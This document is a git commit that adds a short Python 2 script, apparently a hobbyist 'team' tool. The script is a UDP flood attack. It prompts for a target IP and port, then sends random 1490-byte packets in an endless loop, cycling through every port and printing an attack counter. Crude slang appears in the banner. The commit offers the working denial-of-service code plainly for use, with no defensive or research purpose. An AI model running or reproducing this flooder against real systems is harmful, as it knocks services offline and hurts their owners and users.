c097d196e7817a356083bd16a209b5fd426e8c67
SyaizZ <91195968+Syaiban11@users.noreply.github.com>
2021-10-12 20:46:25 +0800

    Add files via upload

---
+++ SyaizZ.py
@@ -0,0 +1,57 @@
+#!/usr/bin/env python2
+import sys
+import os
+import time
+import socket
+import random
+
+K = '\033[93m'
+U = '\033[95m'
+C = '\033[94m'
+R = '\033[91m'
+H = '\033[92m'
+
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("MULAI UNTUK PEMECAH KNTL")
+print
+print (H+"Author   :  SyaizZ")
+print (H+"TEAM     : X'one Team")
+print (H+"Recode   : SyaizZ X SibazZ")
+print
+ip = raw_input(R+"IP Target : ")
+port = input(R+"Port       : ")
+
+os.system("clear")
+os.system("figlet Packet Starting")
+print "[                    ] 0% "
+time.sleep(1)
+print "[=====               ] 25%"
+time.sleep(1)
+print "[==========          ] 50%"
+time.sleep(1)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(1)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print (R+" Paket Kntl datang %s ATTACK TO IP %s ON PORT %s!!"%(sent,ip,port))
+     if port == 65534:
+       port = 1
